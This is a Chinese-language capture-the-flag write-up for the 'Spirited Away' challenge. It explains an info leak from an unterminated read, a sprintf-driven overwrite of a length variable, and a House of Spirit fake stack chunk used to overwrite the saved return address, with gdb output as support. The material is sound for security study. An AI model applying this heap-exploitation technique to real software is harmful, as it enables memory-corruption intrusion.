# Spirited Away
首先在填 reason 由於是用 read 且沒有在輸入字串後加 `\x00` ，所以可以去 leak libc address 和 stack 位置。而這一題最主要的洞在這裡。
```
char v1; // [esp+10h] [ebp-E8h]
size_t nbytes; // [esp+48h] [ebp-B0h]
sprintf(&v1, "%d comment so far. We will review them as soon as we can", cnt);
```
在執行到第10次時 sprintf 會把 nbytes 蓋掉成 `\x00`，在第 100 伺候會把 nbytes 蓋掉成 `n`，因此就能 overflow。但由於他大小蓋 `n` 只能蓋掉 save ebp 以前的內容，蓋不到 eip，因此要想辦法去操控讓能蓋的東西變大。

題目有給提示，可以用 house of Spirited 這種攻擊手法。
## house of Spirited
去建立一個 fake chunk，並去 free 掉建立出來的 fake chunk，我們的 
fake chunk 就會進入到 fastbin 之中，之後就可以透過 malloc 去取得自己建立的 fake chunk 做操作。
```
[-------------------------------------code-------------------------------------]
   0x80488be <survey+689>:	jmp    0x8048829 <survey+540>
   0x80488c3 <survey+694>:	mov    eax,DWORD PTR [ebp-0x54]
   0x80488c6 <survey+697>:	mov    DWORD PTR [esp],eax
=> 0x80488c9 <survey+700>:	call   0x8048480 <free@plt>
   0x80488ce <survey+705>:	jmp    0x804862a <survey+29>
   0x80488d3 <survey+710>:	leave  
   0x80488d4 <survey+711>:	ret    
   0x80488d5 <main>:	push   ebp
Guessed arguments:
arg[0]: 0xffa2b0d8 --> 0x0 
```
```
gdb-peda$ x/50wx 0xffa2b0d0
0xffa2b0d0:	0x00000000	0x00000041	0x00000000	0x00000000
0xffa2b0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffa2b0f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffa2b100:	0x00000000	0x00000000	0x00000000	0x00000000
0xffa2b110:	0x00000000	0x00000041	0xffa2b138	0x08048908
```
可以看到我 free 一個 stack 上的位置，而該位置是我建立大小為 0x40 的 fake chunk，這邊比較要注意的地方在 chunk 的頂端要去對齊 `0x0`，不然會報錯。之後就用 fake chunk 去蓋 save eip。
